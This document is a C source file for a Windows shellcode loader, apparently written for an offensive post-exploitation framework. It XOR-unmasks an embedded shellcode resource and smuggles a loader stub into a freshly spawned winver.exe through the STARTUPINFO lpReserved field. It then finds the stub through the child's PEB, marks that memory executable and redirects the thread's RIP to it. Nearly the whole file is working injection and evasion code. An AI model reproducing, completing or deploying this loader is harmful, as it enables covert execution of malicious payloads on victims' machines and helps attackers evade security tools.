#include <windows.h>
#include <stdint.h>

#include "tcg.h"
#include "win.h"
#include "dfr.h"
#include "utils.h"
#include "shellwriter.h"

char __SC__ [ 0 ] __attribute__ ( ( section ( "sc" ) ) );
char __MASK__   [ 0 ] __attribute__ ( ( section ( "mask"  ) ) );


void go() {

    dprintf("[+] Loader running (go)...\n");

  
    RESOURCE * masked_sc = ( RESOURCE * ) GETRESOURCE ( __SC__ );
    RESOURCE * mask_key   = ( RESOURCE * ) GETRESOURCE ( __MASK__ );

    dprintf("[+] Read resource masked SCDATA size: %d\n", masked_sc->length);
    dprintf("[+] Read resource masked SCDATA value addr: %p\n", masked_sc->value);


    char unmasked_sc[masked_sc->length];
    for ( int i = 0; i < masked_sc->length; i++ ) {
        unmasked_sc [ i ] = masked_sc->value [ i ] ^ mask_key->value [ i % mask_key->length ];
    }

    u8 stub[SCW_BUF_LARGE];
    int _i; for (_i = 0; _i < SCW_BUF_LARGE; _i++) stub[_i] = 0;
    SCW w;
    scw_init(&w, stub, sizeof(stub));
    scw_load_and_call(&w,
        (u64)KERNEL32$VirtualAlloc,
        (u64)KERNEL32$VirtualProtect,
        (const u8 *)unmasked_sc, masked_sc->length);


    dprintf("[+] ShellWriter stub: %d bytes, nulls: %s\n",
        w.len, scw_check_nulls(&w) == -1 ? "none" : "BUG");

    // wchar_t unicode_payload[masked_sc->length / 2]; 
    // memset(unicode_payload, 0, sizeof(unicode_payload));
    // bytes_to_wchar((const uint8_t*)unmasked_sc, sizeof(unmasked_sc), unicode_payload);

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);

    PROCESS_BASIC_INFORMATION pbi;
    DWORD retLen;
    
    PEB pebLocal;
    SIZE_T sizeToRead = sizeof(pebLocal);
    SIZE_T bytesRead = 0;

    RTL_USER_PROCESS_PARAMETERS parameters;

    const wchar_t lpApplicationWide[] = {
        L'C', L':', L'\\', L'W', L'i', L'n', L'd', L'o', L'w', L's', L'\\',
        L'S', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\',
        L'w', L'i', L'n', L'v', L'e', L'r', L'.', L'e', L'x', L'e', // winver.exe
        L'\0'
    };


    dprintf("[+] Calling CreateProcessW...\n");
    si.lpReserved = (LPWSTR)stub;
    KERNEL32$CreateProcessW(lpApplicationWide, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);


    dprintf("[+] Process created PID: %p\n", pi.dwProcessId);

    KERNEL32$Sleep(200);

    NTDLL$NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &retLen);

    NTSTATUS status;
    status = NTDLL$NtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &pebLocal, sizeToRead, &bytesRead);
    if(!NT_SUCCESS(status)){
        dprintf("[-] Failed NtReadVirtualMemory (PEB)...\n");
        return;
    } 

    status = NTDLL$NtReadVirtualMemory(pi.hProcess, pebLocal.ProcessParameters, &parameters, sizeof(RTL_USER_PROCESS_PARAMETERS), &bytesRead);
    if(!NT_SUCCESS(status)){
        dprintf("[-] Failed NtReadVirtualMemory (PROCPARAMS)...\n");
        return;
    }

    ULONG_PTR remoteBuffer = (ULONG_PTR)parameters.ShellInfo.Buffer;
    PVOID shellcode = (PVOID)remoteBuffer; 
    
    ULONG_PTR unalignedAddr = (ULONG_PTR)shellcode;
    ULONG_PTR alignedAddr = unalignedAddr & ~(4096 - 1); 
    PVOID base = (PVOID)alignedAddr;
    ULONG oldp = 0;
    
    SIZE_T shellcodeSize = (SIZE_T)w.len + (unalignedAddr - alignedAddr);
    
    status = NTDLL$NtProtectVirtualMemory(pi.hProcess, &base, &shellcodeSize, PAGE_EXECUTE_READ, &oldp);

    if(!NT_SUCCESS(status)){
        dprintf("[-] Failed NtProtectVirtualMemory...\n");
        return;
    } 

    CONTEXT ctx __attribute__((aligned(16)));
    ZeroMemory(&ctx, sizeof(CONTEXT));
    ctx.ContextFlags = CONTEXT_CONTROL; 

    status = NTDLL$NtGetContextThread(pi.hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtGetContextThread failed...\n");
        return;
    }

    // Hijack target thread RIP
    ctx.Rip = (DWORD64)shellcode;
    
    status = NTDLL$NtSetContextThread(pi.hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        dprintf("[-] NtSetContextThread failed...\n");
        return;
    } else {
        dprintf("[+] Success hijacking thread RIP to shellcode!\n");
    }

    dprintf("[+] === EXIT LOADER ===\n");
   
   
}

